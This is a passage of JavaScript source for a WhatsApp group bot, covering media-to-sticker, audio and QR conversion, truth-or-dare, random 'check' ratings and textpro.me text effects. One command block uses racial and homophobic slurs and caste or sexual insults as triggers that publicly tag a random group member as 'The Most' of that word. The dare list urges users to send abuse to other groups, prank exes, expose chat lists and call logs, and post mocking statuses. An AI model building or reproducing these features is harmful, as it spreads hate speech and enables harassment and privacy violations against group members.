            Kyuu.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${Kyuu.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            if (!quoted) return replygcxeon(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            replygcxeon(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            Kyuu.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
                if (!quoted) return replygcxeon('Reply video')
                if (!/webp/.test(mime)) return replygcxeon(`reply sticker with caption *${prefix + command}*`)
                replygcxeon(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await Kyuu.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await Kyuu.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toqr':{
  if (!q) return replygcxeon(' Please include link or text!')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await Kyuu.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
  case 'dare':
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I missðŸ¥ºðŸ‘‰ðŸ¼ðŸ‘ˆðŸ¼",
	"Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice noteðŸ¤£ðŸ¤£",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
    "say i love the bot owner xeon through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love depak kalal through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love youðŸ˜Œ",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const xeondare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              Kyuu.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ xeondare }, {quoted:m})
              break
                            break
       case 'truth':
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ??",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetril?", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, xeon?ðŸ¤£",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
              const xeontruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              Kyuu.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ xeontruth }, {quoted:m})
              break
case 'checkme':
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					buff = await getBuffer(ppuser)
Kyuu.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
break
case 'toimg': {
if (!/webp/.test(mime)) return replygcxeon(`balas stiker dengan caption *${prefix+command}*`)
let media = await Kyuu.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return replygcxeon(err)
let buffer = fs.readFileSync(ran)
Kyuu.sendMessage(m.chat, { image: buffer, jpegThumbnail: defaultpp }, { quoted: m })
fs.unlinkSync(ran)
})
}
break
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!isPrem) return replyprem(mess.premium)
if (!args.join(" ")) return replygcxeon(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (m.quoted.isAnimated === true) {
Kyuu.downloadAndSaveMediaMessage(quoted, "gifee")
Kyuu.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Kyuu.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await Kyuu.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else {
replygcxeon(`Photo/Video?`)
}
}
break
case 'sticker': 
case 's': {
if (!quoted) return replygcxeon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Kyuu.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await Kyuu.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
replygcxeon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
case 'stupid':
      case 'foolish':
      case 'smart':
      case 'idiot':
      case 'gay':
      case 'lesbi':
      case 'bastard':
      case 'stubble':
      case 'dog':
      case 'fuck':
      case 'ape':
      case 'noob':
      case 'great':
      case 'horny':
      case 'wibu':
      case 'asshole':
      case 'handsome':
      case 'beautiful':
      case 'cute':
      case 'kind':
      case 'ugly':
      case 'pretty':
      case 'lesbian':
      case 'randi':
      case 'gandu':
      case 'madarchod':
      case 'kala':
      case 'gora':
      case 'chutiya':
      case 'nibba':
      case 'nibbi':
      case 'bhosdiwala':
      case 'chutmarika':
      case 'bokachoda':
      case 'suarerbaccha':
      case 'bolochoda':
      case 'muthal':
      case 'muthbaaz':
      case 'randibaaz':
      case 'topibaaz':
      case 'cunt':
      case 'nerd':
      case 'behenchod':
      case 'behnchoda':
      case 'bhosdika':
      case 'nerd':
      case 'mc':
      case 'bsdk':
      case 'bhosdk':
      case 'nigger':
      case 'loda':
      case 'laund':
      case 'nigga':
      case 'noobra':
      case 'tharki':
      case 'nibba':
      case 'nibbi':
      case 'mumu':
      case 'rascal':
      case 'scumbag':
      case 'nuts':
      case 'comrade':
      case 'fagot':
      case 'scoundrel':
      case 'ditch':
      case 'dope':
      case 'gucci':
      case 'lit':
      case 'dumbass':
      case 'sexy':
      case 'crackhead':
      case 'mf':
      case 'motherfucker':
      case 'dogla':
      case 'bewda':
      case 'boka':
      case 'khanki':
      case 'bal':
      case 'sucker':
      case 'fuckboy':
      case 'playboy':
      case 'fuckgirl':
      case 'playgirl':
      case 'hot': {
if (!m.isGroup) return replygcxeon(mess.group)
let member = participants.map((u) => u.id)
let org = member[Math.floor(Math.random() * member.length)]
Kyuu.sendMessage(m.chat,
{ text: `The Most ${command} Here Is @${org.split('@')[0]}`,
contextInfo:{
mentionedJid:[org],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})
}
break
case 'quotes':
const quotexeony = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quotexeony.data.quote.body}\n\n*${themeemoji} Author:* ${quotexeony.data.quote.author}`
return replygcxeon(textquotes)
break
case 'handsomecheck':
				if (!text) return replygcxeon(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
Kyuu.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
					break
case 'beautifulcheck':
				if (!text) return replygcxeon(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
Kyuu.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
					break
					case 'charactercheck':
					if (!text) return replygcxeon(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const xeony =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = xeony[Math.floor(Math.random() * xeony.length)]
					Kyuu.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
				     break
case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
                 case 'prettycheck':
                    case 'lovelycheck':
                      case 'uglycheck':
if (!m.isGroup) return replygcxeon(mess.group)
const cex = body.slice(0)
const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
Kyuu.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByReply.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
} else if (mentionByTag[0] && isGroup) {
Kyuu.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByTag[0].split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
} else if (!mentionByReply && !mentionByTag[0]) {
Kyuu.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
}
break
/*case 'obfus': case 'obfuscate':{
if (!q) return replygcxeon(`Example ${prefix+command} const xeonbot = require('baileys')`)
let meg = await obfus(q)
replygcxeon(`Success
${meg.result}`)
}
break*/
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scraper')
		if (!text) return replygcxeon('Enter Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                replygcxeon(teks)
	    }
	    break
case 'candy': 
case 'christmas': 
case '3dchristmas': 
case 'sparklechristmas':
case 'deepsea': 
case 'scifi': 
case 'rainbow': 
case 'waterpipe': 
case 'spooky': 
case 'pencil': 
case 'circuit': 
case 'discovery': 
case 'metalic': 
case 'fiction': 
case 'demon': 
case 'transformer': 
case 'berry': 
case 'thunder': 
case 'magma': 
case '3dstone': 
case 'neonlight': 
case 'glitch': 
case 'harrypotter': 
case 'brokenglass': 
case 'papercut': 
case 'watercolor': 
case 'multicolor': 
case 'neondevil': 
case 'underwater': 
case 'graffitibike':
case 'snow': 
case 'cloud': 
case 'honey': 
case 'ice': 
case 'fruitjuice': 
case 'biscuit': 
case 'wood': 
case 'chocolate': 
case 'strawberry': 
case 'matrix': 
case 'blood': 
case 'dropwater': 
case 'toxic': 
case 'lava': 
case 'rock': 
case 'bloodglas': 
case 'hallowen': 
case 'darkgold': 
case 'joker': 
case 'wicker':
case 'firework': 
case 'skeleton': 
case 'blackpink': 
case 'sand': 
case 'glue': 
case '1917': 
case 'leaves': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return replygcxeon(`Example : ${prefix+command} Kyuu`) 
replygcxeon(mess.wait)
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await textpro.textpro(link, q)
Kyuu.sendMessage(m.chat, { image: { url: anu }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
